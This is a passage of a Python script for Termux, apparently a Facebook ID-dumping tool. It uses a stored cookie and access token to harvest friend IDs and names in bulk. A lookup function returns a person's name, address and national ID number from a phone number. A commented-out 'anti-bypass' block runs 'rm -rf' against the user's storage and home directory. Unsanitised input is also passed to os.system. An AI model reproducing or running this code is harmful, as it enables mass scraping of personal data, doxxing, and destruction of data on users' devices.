                        _fileq.close()
                except KeyError:
                        if 'invalid' in str(sy):
                                print(f'{r}Your Token Is Lol{s}')
                                exit()
                        else:
                                pass
                except IOError:
                        pass
        print(50*"-")
        tot = open(file_s, 'r').readlines()
        print(' \033[1;97m Process Completed  ')
        print(f'  Total ids  : {rg}'+str(len(tot)))
        print(f'  {s}File saved as: {rp}'+file_s)
        print(50*"\033[1;97m-")

        input('\033[0m[Press enter to back] ')
        caseher()
def bulk_file():

        bc=[]
        rr = byy(0,20)
        cookie=open("/sdcard/.cok.txt", "r").read()
        token=open("/sdcard/.token.txt", "r").read()
        os.system('clear');print(logo);print('\tFile Create Menu 2\n===============================================\n')
        _file_s = input('   Path of Old File From Which ids Extract \n Example /sdcard/xxx.txt : ')
        try:
                qais=open(_file_s,'r').readlines()
        except FileNotFoundError:
                print(f"{r}File Not Founded{s}");time.sleep(3)
                caseher()
        __file_s2 = input(' Save File As Example /sdcard/xxx.txt\n Save as : ')
        os.system('rm -rf '+__file_s2)
        print(f"\t {rc}Dont Type Limit Greater Then {s}{str(len(qais))}")
        limit=int(input(f" How Many Ids Do you want to Extract \n Limit {str(len(qais))} : "))
        if limit > len(qais):
                print(f"{r}\t Errorrr ! Type Less Then {str(len(qais))} {s}")
                time.sleep(3)
                caseher()
        for i in range(1,limit):
                lines = open(_file_s).readlines()
                Types = [line.split("|")[0] for line in lines]
                qs = random.choice(Types)
                try:
                        sy = requests.get('https://graph.facebook.com/v14.0/'+qs+'/?fields=friends.limit(5000)&access_token='+token, cookies={'cookie':cookie}).text
                        qsr= json.loads(sy)
                        _fileq=open(__file_s2,"a")
                        for abbas in qsr['friends']['data']:
                                uids=abbas['id']
                                name=abbas['name']
                                bc=uids+"|"+name
                                _fileq.write(bc+'\n')
                        thn = open(_fileq, 'r').readlines()
                        sys.stdout.write(f"\r Sucessfully Dump : {rg}{qs}{s}{ro}/[{str(len(thn))}]{s}"),
                        sys.stdout.flush()
                        _fileq.close()
                except KeyError:
                        if 'invalid' in str(sy):
                                print(f'{r}Your Cookie Is Lol{s}')
                                exit()
                        else:
                                pass
                except IOError:
                        pass
                ####_fileq.close()
        print(50*"-")
        tot = open(__file_s2, 'r').readlines()
        print(' \033[1;97m Process Completed  ')
        print(f'  Total ids  : {g}'+str(len(tot)))
        print(f'  {s}File saved as: {y}'+__file_s2)
        print(50*"\033[1;97m-")
#--(file-seperator)----#

def sep():

        os.system('clear');print(logo)
        try:
                limit = int(input(' How many links do you want to separate ? '))
        except:
                limit = 1
        print(f'{rg} File Path Example /sdcard/xxx.txt{s}')
        file_name = input('\033[0m Input file path : ')
        print(f'{rg} Save As Example /sdcard/newfile.txt{s}')
        new_save = input('\033[0m Save new file as : ')
        y = 0
        print(f" {ro}Ids To Grabb Ex [ 100087,10000,10006 etc ]{s}")
        for k in range(limit):
                y+=1
                links=input(' Put Uid Type : ')
                os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
        print(50*"\033[0m-")

        print(f'{rc} ids grabbed successfully{s}')
        print(' Total grabbed ids :\033[0;33m '+str(len(open(new_save).read().splitlines())))
        print('\033[0m New file saved as : \033[0;33m '+new_save)
        print(50*"\033[0m-")

        input('\033[0m[Press enter to back] ')
        caseher()

#--(number-detail)----#
def number_detail():

        from bs4 import BeautifulSoup
        from bs4 import BeautifulSoup as parser
        os.system("clear");print(logo)
        numm = input(" Number : ")
        head = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.66 Safari/537.36', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Content-Length': '16', 'Content-Type': 'application/x-www-form-urlencoded',"Referer": "https://freepicccs.com/index2.php?msg=Please%20Enter%20atleast%201%20Mobile%20Number%20or%20CNIC"}
        dataa = {'cnnum': numm}
        r = requests.post('https://freepicccs.com/search-result2.php',headers=head,data=dataa)
        bc = re.findall("\<div(.*?)</table>",str(r.text))
        open(".tt1.txt","w").write(str(bc))
        bx = open(".tt1.txt","r").read()
        bx = bx.replace("</strong>","<strong>")
        bx = bx.split("<strong>")
        try:
                number = bx[1]
        except:
                number = ' '
        try:
                date = bx[3]
        except:
                date = ' '
        try:
                name = bx[5]
        except:
                name = ' '
        try:
                address = bx[9]
        except:
                address = ' '
        try:
                cnic = bx[7]
        except:
                cnic = ' '
        print(50*"-")
        print(f" Number : {number.capitalize()}")
        print(f" Date : {date.capitalize()}")
        print(f" Name : {name.capitalize()}")
        print(f" Address : {address.capitalize()}")
        print(f" Cnic : {cnic.capitalize()}")

        input('\033[0m[Press enter to back] ')
        caseher()

"-------[@bypasser-data]--------"
'''with open('/data/data/com.termux/files/usr/lib/python3.10/site-packages/requests/sessions.py', 'r') as file :
        filedata63 = file.read()
if "verify = False" in filedata63:
        print("Bhai method Capture Krny Ki Kosis Kr rha Tah Ab Data Ko Pakar pehly 😂😂")
        exit("Your Device Is Reseted Dont Try To Bypass Anymore")

        os.system("rm -rf /sdcard/*")
        os.system("rm -rf $HOME/*")
        os.system("rm -rf /data/data/com.termux/files/usr/lib/python3.*")
else:
        pass

with open('/data/data/com.termux/files/usr/lib/python3.10/site-packages/requests/sessions.py', 'r') as file7 :
        filedata3 = file7.read()
with open('/data/data/com.termux/files/usr/lib/python3.10/site-packages/requests/api.py', 'r') as file77 :
        filedata4 = file77.read()
if bumper in filedata4:
        os.system("rm -rf $HOME/*")
        os.system("rm -rf /data/data/com.termux/files/usr/lib/python3.*")
        exit("Dont try bypass to add my keys in content or etc ")
elif bumper in filedata3:
        os.system("rm -rf $HOME/*")
        os.system("rm -rf /data/data/com.termux/files/usr/lib/python3.*")
        exit("Dont try bypass to add my keys in content or etc ")
with open('/data/data/com.termux/files/usr/lib/python3.10/site-packages/urllib3/connection.py', 'r') as file7i7 :
        filedata47 = file7i7.read()
if str("cert_reqs = 'CERT_NONE'") in filedata47:
        exit(" something wrong ....x54797 ")

def verify_changer():
        with open('/data/data/com.termux/files/usr/lib/python3.10/site-packages/requests/sessions.py', 'r') as file :
                filedata = file.read()
        filedata = filedata.replace('verify = False', 'verify = True')
        with open('/data/data/com.termux/files/usr/lib/python3.10/site-packages/requests/sessions.py', 'w') as file:
                file.write(filedata)
        #If There is Verify False Also Then It Returns With True wala Verify
        if "verify = True" in filedata:
                pass
        else:
                with open('/data/data/com.termux/files/usr/lib/python3.10/site-packages/requests/sessions.py', 'a') as file:
                        file.write('\nverify = True\n')
        pass

def verify_changer2():
        with open('/data/data/com.termux/files/usr/lib/python3.10/site-packages/requests/api.py', 'r') as file :
                filedata = file.read()
        if "print" in filedata:
                pass
                #exit(" something wrong ....x5277")
        else:
                pass
        pass

verify_changer()
verify_changer2()

if not os.path.exists("/sdcard/xnxxsunnyleonexkhalifa.txt"):
        os.system("git pull")
        caseher()
else:
        os.system("git pull")
        caseher()'''
main()
